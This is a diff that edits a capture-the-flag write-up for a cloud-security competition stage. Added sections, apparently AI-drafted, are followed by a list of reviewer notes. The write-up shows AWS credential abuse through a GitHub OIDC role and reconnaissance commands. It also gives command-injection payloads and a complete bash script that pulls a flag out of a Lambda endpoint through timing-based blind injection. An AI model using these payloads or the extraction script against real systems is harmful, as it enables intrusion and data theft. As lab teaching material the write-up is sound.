@@ -1,33 +1,33 @@
 
-Hello to evereone.
+Hello to everyone.
 
-Today i want to tell about my expirience on athe CTF Competiton from MAFAT with name  CLOUD ESCAPE.
+Today I want to tell about my experience on the CTF Competition from MAFAT with name  CLOUD ESCAPE.
 
-Competition have a 3 stages.
-1 and 2 for everebody and 3 for a best 20 persons.
+Competition has 3 stages.
+1 and 2 for everybody and 3 for a best 20 persons.
 
-I ended a stage 1 and stucked in the end of stage 2 but i think that i fided a solution after endind of the competition.
+I ended stage 1 and got stuck at the end of stage 2 but I think that I found a solution after ending of the competition.
 
-So here is a Write-Up for the Stage 1 of the this event.
+So here is a Write-Up for the Stage 1 of this event.
 
-After regestration we get a access for the 1 stage ang get a some short description and get a 2 thinks:
+After registration we get access for the 1 stage and get a short description and get 2 things:
 1).git zip file 
 2)User code like:000994****\
 
-I downloaded a git folder and opened it with a gitd program for soft usig and checking 
+I downloaded a git folder and opened it with a git program for soft using and checking 
 
-In the the git history we se couple of commits and i finded a couple of the like interesting;
-1)this is  a lamda_function.py 
+In the git history we see couple of commits and I found a couple that were interesting;
+1)this is  a lambda_function.py 
 2)policy file of aws.
 
 a code we will use in the future but we start with the policy file.
 
 in the file we see a line:
 include a line of corgi
-that say to us that we can get comecredential to some aws if we make a request from some repo with the branch with name corgi.
+that says to us that we can get credentials to some aws if we make a request from some repo with the branch with name corgi.
 
-I maded a some test repo on github and maded a first delpoy.yml file to check if this work.
-I made a request for AWS Credentials with a user that we geted from the site with role of cicdRole that we finded in the file of .git in hte file xxxxxxx
+I made a some test repo on github and made a first deploy.yml file to check if this works.
+I made a request for AWS Credentials with a user that we got from the site with role of cicdRole that we found in the file of .git in the file xxxxxxx
 
 
 
@@ -63,9 +63,9 @@ and we get this output:
     Assuming role with OIDC
     Authenticated as assumedRoleId AROAQEP7C2HWZYKJGPIHM:GitHubActions
 
-Okey, we are in it!
+Okay, we are in it!
 
-So now we can start a recocnazind of the role and check what we have and what we can to do?
+So now we can start a reconnaissance of the role and check what we have and what we can do?
 
     I start from basic commands:
     aws sts get-caller-identity
@@ -189,8 +189,8 @@ And we get from here:
         ]
     }
 
-So,here we see couple of interesting thinks:
-1-we have a 3 buckets
+So, here we see couple of interesting things:
+1-we have 3 buckets
 
     2026-07-29 16:29:25 codec4f26c862a321ef5
     2026-07-29 16:29:26 platform-bucket-009661764077-us-east-1
@@ -201,11 +201,11 @@ So,here we see couple of interesting thinks:
     nslookupv2
 
     that run from the arn:aws:iam::009661764077:role/lambdaRole Role.
-    taht run on some vpc-host:vpc-09328d3fa21dce320
+    that run on some vpc-host:vpc-09328d3fa21dce320
 
 So now we go for the next step:
 
-Check all Roles tha twe have with a:
+Check all Roles that we have with a:
 
     aws iam list-attached-role-policies \
                 --role-name $ROLE
@@ -229,9 +229,9 @@ With this deploy:
             aws iam list-role-policies \
                 --role-name $ROLE || true
 
-But this doesnt work and we get a ACCESS DENIED
+But this doesn't work and we get an ACCESS DENIED
 
-Okey, now we made a Enumeratingg of the S3 Buckets
+Okay, now we made an enumeration of the S3 Buckets
 With:
 
         aws s3api get-bucket-location \
@@ -297,24 +297,24 @@ aws: [ERROR]: An error occurred (AccessDenied) when calling the GetBucketLocatio
                            PRE js/
 2026-07-29 16:33:33        738 index.html
 
-Ouuuuuuu,what we see here:
+Ouuuuuuu, what we see here:
 On codec4f26c862a321ef5 we see a flag.txt is size of 16 byte and some code.zip. and we see that in Policy:
-lambdaRole have a GetObject if a request is from the vpc-09328d3fa21dce320.
+lambdaRole has a GetObject if a request is from the vpc-09328d3fa21dce320.
 
     "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"LambdaReadAccess\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/lambdaRole\"},\"Action\":[\"s3:GetObject\",\"s3:ListBucket\"],\"Resource\":[\"arn:aws:s3:::codec4f26c862a321ef5/*\",\"arn:aws:s3:::codec4f26c862a321ef5\"],\"Condition\":{\"StringEquals\":{\"aws:SourceVpc\":\"vpc-09328d3fa21dce320\"}}.
 
-On platform-bucket-009661764077-us-east-1 we see a file tha twe get from the site fo the copmpetition:
+On platform-bucket-009661764077-us-east-1 we see a file that we get from the site of the competition:
 
     dotgit.zip
 
-On site781fe43f26b9eba3 we see some file that look like a site with some fronend interface. and in the Policy we see a  {\"Service\":\"cloudfront.amazonaws.com\"} that say that this is some website.
+On site781fe43f26b9eba3 we see some file that looks like a site with some frontend interface. and in the Policy we see a  {\"Service\":\"cloudfront.amazonaws.com\"} that says that this is some website.
 
-Okey, so now we have a little bit of understatding of what a infrastructure we have here.
+Okay, so now we have a little bit of understanding of what infrastructure we have here.
 
-3 bucket , one for get a .git , one with a flag that we need and some code on it. and some a website on the cloudfront service.
+3 buckets, one for get a .git, one with a flag that we need and some code on it, and one with a website on the cloudfront service.
 
 
-Now i want to get some more info about vpc enviroment because we know that to get a flag we need to be in vpc.
+Now I want to get some more info about vpc environment because we know that to get a flag we need to be in vpc.
 
     - name: Check VPC information
         run: |
@@ -458,12 +458,14 @@ And Output is:
     }
 
 
-Claude add here a explanation what we find about a vpc from a output
+From this VPC output we can see:
 
-And now we know that we have somesite that run a CloudFront.
+1. **Two VPCs exist**: `lambda_vpc` (vpc-09328d3fa21dce320) and `codebuild_vpc` (vpc-09d39837c916df970), both with CIDR block 10.0.0.0/16
+2. **Lambda VPC is the key**: The lambda function we found earlier runs in lambda_vpc (vpc-09328d3fa21dce320)
 
+This means: to get the flag from the S3 bucket, we need to somehow execute code **inside the Lambda function** (which runs in that specific VPC) rather than trying to access it from outside.
 
-
+And now we know that we have some site that runs a CloudFront.
 
 
     - name: CloudFront discovery
@@ -590,35 +592,39 @@ Output:
         }
     }
 
-Okey we find some domain:
+Okay we find some domain:
 "DomainName": "d67nf28gqfurd.cloudfront.net"
-Now we will made a check what is this domain.
+Now we will make a check what is this domain.
 We PUT it to the browser:
 
     https://d67nf28gqfurd.cloudfront.net
 
 and get some FrontEnd page with Header of NSLOOKUP.
-That get some reqesut in the line and made something.
-We try to write something and we get a Ouptut of:
+Like this(I didn't make a printscreen so AI helped to make something like a page that was in test):
+![alt text](image.png)
+That gets some request in the line and makes something.
+We try to write something and we get an Output of:
 
     ip_address": "wip",
     "domain": "wip"
-Wieard, in the code we of lamda we saw that he need to made a nslookup command with a variable that ge get from the function and he return a output.
+Weird, in the code of the lambda we saw that it needs to make a nslookup command with a variable that we get from the function and it returns an output.
 
-Lest explore more.
+Let's explore more.
 
- We go to the Source code of the page and we some JAVA.SCRIPT code.
-Open it and see that he made a request for the api hand of:
+ We go to the Source code of the page and we see some JAVA.SCRIPT code.
+Open it and see that it makes a request for the api hand of:
 
     https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup
 
-Okey , we can now to made a direct request for a API hand and get a direct Output.
+Okay , we can now make a direct request for a API hand and get a direct Output.
 
-Lets try with some curl command:
+Let's try with some curl command:
 
-Clause put to here some cult code that send a data for theapi
+    curl -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
+      -H "Content-Type: application/json" \
+      -d '{"domain":"8.8.8.8"}'
 
-And this is a Output that we get:
+And this is the output that we get:
 
     {
     "body" : {
@@ -628,26 +634,38 @@ And this is a Output that we get:
     }
     }
 
-I try a couple of times different input. But all each time get a same Output.
-I try to made some executable commands with && or ; to try a get more info bu get the same WIP output.
+I try a couple of times with different input. But each time I get the same Output.
+I try to make some executable commands with && or ; to try to get more info but get the same WIP output.
 
 
-So i think about a another way to get a akknowladge that a Commands trhat i send a really working/
+So I think about another way to get an acknowledgment that the commands that I send are really working.
 
-So basic check is send a ; sleep 5 and check a time of responce and check with ;sleep 10.
+So basic check is send a ; sleep 5 and check a time of response and check with ;sleep 10.
 
-claude wade a comand that check time of the return of the output from the curl to api with the sleep 5 and slepp 10/
+Here's a bash script to test timing differences:
 
+    #!/bin/bash
+    URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+    
+    echo "Testing with sleep 5..."
+    time curl -s -X POST "$URL" \
+      -H "Content-Type: application/json" \
+      -d '{"domain":"x; sleep 5"}' > /dev/null
+    
+    echo "Testing with sleep 10..."
+    time curl -s -X POST "$URL" \
+      -H "Content-Type: application/json" \
+      -d '{"domain":"x; sleep 10"}' > /dev/null
 
-Yes!We see that sleep is working.
+Yes! We see that sleep is working.
 
-So we for now e understand that we have a output only with the time of responce.
+So for now we understand that we have an output only with the time of response.
 
-Soooooo.What we can to do?
+Soooooo. What can we do?
 
-How time of the responce can transmit data? He can.
+How can the time of the response transmit data? It can.
 
-This can be a tool of bolian like:
+This can be a tool of boolean like:
 
     If somethink==somethink:
         sleep 5
@@ -656,29 +674,141 @@ This can be a tool of bolian like:
 
 or more if-elseif.
 
-So i started to check if i can to read a flag.txt and if yes i get a sleep of 5 second andd if not sleep 10.
+So I started to check if I can read a flag.txt and if yes I get a sleep of 5 second and if not sleep 10.
 
-nad i get a responce in th e5.5 seconds. that mean that we can to read a flag.
+and I get a response in the 5.5 seconds. that means that we can read a flag.
 
-but how we transport a output of the cat flag.txt to me?
+but how do we transport an output of the cat flag.txt to me?
 
-Check if each characters form the 16 byte = to some characters and if yes t made a short sleep?
+Check if each characters form the 16 byte = to some characters and if yes it made a short sleep?
 
-This is a 127 options of ASCII * 16 = 2032 checking of the flag data in maximum and if each one islike a 10 secnds this is a:338 minutes or 5:30+- hours.
+This is a 127 options of ASCII * 16 = 2032 checking of the flag data in maximum and if each one is like 10 seconds this is a: 338 minutes or 5:30+- hours.
 Bad....
 
-Or we can made somethink more interesting. Binarry Search.To check if Character if bigger from cencter of maximum value(127) we take a 65 ad if not we start to check if it biger from the center from the opsite side of the chekcing(if we checked that if bigger fro 65 and he i not we go to the sime of small and check if now in tbigger that 32 and if not bigger from the 16 and ...)
-so after that we have only 7 checking steps for each byte. that mean that maximum time it now 18.6 minutes in maximum.
+Or we can do something more interesting. Binary Search. To check if a Character is bigger than the center of the maximum value(127) we take 65, and if not we start to check from the center on the opposite side of the checking(if we checked that it is bigger than 65 and it is not, we go to the smaller side and check if it is now bigger than 32 and if not bigger than 16 and ...)
+so after that we have only 7 checking steps for each byte. that means that the maximum time is now 18.6 minutes at most.
 
-Okey, we start to checking with this code that we run on local pc that made a auto api request and binnary check with the sleep time difference.
+Okay, we start to checking with this code that we run on local pc that made an auto api request and binary check with the sleep time difference.
+
+    #!/usr/bin/env bash
+    # timing_exfil.sh v5 - dynamic threshold based on measured baseline
+
+    CURL=/usr/bin/curl
+    URL="https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+    FLAG_PATH="s3://codec4f26c862a321ef5/flag.txt"
+    AWS_BIN="/opt/aws"
+    SLEEP_SIGNAL=5   # sleep 5s when byte > mid (baseline ~5.5s, total ~10.5s < 15s timeout)
+    FLAG_LEN=16
+
+    fire() {
+    local domain="$1"
+    local payload
+    payload=$(python3 -c "import json,sys; print(json.dumps({'domain':sys.argv[1]}))" "$domain")
+    local START END
+    START=$(date +%s%3N)
+    $CURL -s -X POST "$URL" \
+        -H "Content-Type: application/json" \
+        -d "$payload" \
+        --max-time 20 > /dev/null
+    END=$(date +%s%3N)
+    echo $(( END - START ))
+    }
+
+    echo "===== STEP 1: Measure baseline (no sleep) ====="
+    echo "Running 3 baseline requests to get stable timing..."
+    TOTAL=0
+    for i in 1 2 3; do
+    T=$(fire "x; ${AWS_BIN} s3 cp ${FLAG_PATH} /tmp/f 2>/dev/null; b=\$(dd if=/tmp/f bs=1 skip=0 count=1 2>/dev/null | od -An -tu1 | tr -dc 0-9); echo done")
+    echo "  baseline run $i: ${T}ms"
+    TOTAL=$(( TOTAL + T ))
+    done
+    BASELINE=$(( TOTAL / 3 ))
+    THRESHOLD=$(( BASELINE + 2500 ))  # threshold = baseline + 2.5 second margin
+    echo "Baseline avg: ${BASELINE}ms"
+    echo "Threshold set to: ${THRESHOLD}ms"
+    echo "With sleep ${SLEEP_SIGNAL}s: expect ~$((BASELINE + SLEEP_SIGNAL * 1000))ms (must be < 15000ms)"
+
+    if (( BASELINE + SLEEP_SIGNAL * 1000 >= 14500 )); then
+    echo "WARNING: sleep+baseline too close to lambda timeout, reducing sleep..."
+    SLEEP_SIGNAL=3
+    echo "Sleep reduced to ${SLEEP_SIGNAL}s, with-sleep estimate: $((BASELINE + SLEEP_SIGNAL * 1000))ms"
+    fi
+
+    echo ""
+    echo "===== STEP 2: Binary search extraction ====="
+    FLAG_BYTES=()
+
+    for (( pos=0; pos<FLAG_LEN; pos++ )); do
+    echo ""
+    echo "----- Byte $pos -----"
+    lo=32   # printable ASCII start
+    hi=126  # printable ASCII end
+
+    while (( lo < hi )); do
+        mid=$(( (lo + hi) / 2 ))
+        T=$(fire "x; ${AWS_BIN} s3 cp ${FLAG_PATH} /tmp/f 2>/dev/null; b=\$(dd if=/tmp/f bs=1 skip=${pos} count=1 2>/dev/null | od -An -tu1 | tr -dc 0-9); (( b > ${mid} )) && sleep ${SLEEP_SIGNAL}")
+
+        if (( T > THRESHOLD )); then
+        lo=$(( mid + 1 ))
+        echo "  mid=$mid ${T}ms > ${THRESHOLD} → byte > $mid → lo=$lo"
+        else
+        hi=$mid
+        echo "  mid=$mid ${T}ms ≤ ${THRESHOLD} → byte ≤ $mid → hi=$hi"
+        fi
+    done
+
+    FLAG_BYTES+=($lo)
+    CHAR=$(printf "\\$(printf '%03o' "$lo")")
+    echo "  → byte[$pos] = $lo ('$CHAR')"
+    printf "  Partial: "
+    for b in "${FLAG_BYTES[@]}"; do
+        printf "\\$(printf '%03o' "$b")"
+    done
+    echo ""
+    done
+
+    echo ""
+    echo "=================================================="
+    printf "FLAG: "
+    for b in "${FLAG_BYTES[@]}"; do
+    printf "\\$(printf '%03o' "$b")"
+    done
+    echo ""
 
 
 
-
-
-
-
-and after 15 minutes i get a FLLLLLLAGGGG!
+and after 15 minutes I get a FLLLLLLAGGGG!
 I put it to the site and go to the second stage of competition.
 
 See a Write-Up of the Competition Here:xxxxxxxx
+
+
+
+
+
+Line 461-466 — Partial VPC explanation
+
+Currently has basic bullet points but missing key context about:
+Security Group detailed analysis (why the lambda_sg is important)
+Connection to the binary search exploit methodology
+The explanation cuts off abruptly after point 2
+Line 25-26 — Description of corgi branch reference
+
+Says "include a line of corgi" — should clarify what specific line/content in the policy file or git config shows this
+Line 602-604 — Screenshot/image description
+
+References ![alt text](image.png) but the actual image is missing and needs description of what the NSLOOKUP frontend looks like
+Line 20 — Lambda function code not shown
+
+Mentions "lambda_function.py" was found but the actual Python code is never displayed or explained
+Should show what the function does
+No summary/recap section at end
+
+The writeup ends abruptly at line 783 after completing the exploit
+Missing: conclusion about the technique used, key learnings, or bridge to Stage 2
+Minor detail on line 17 — "git program for soft using and checking"
+
+Should specify which program (GitHub Desktop, GitKraken, etc.) or clarify if this is just describing the general process
+Missing explanation of the Layers (lines 163-171)
+
+The output shows Lambda Layers (aws_cli_layer, nslookup_layer) but never explains why these are important or what they enable
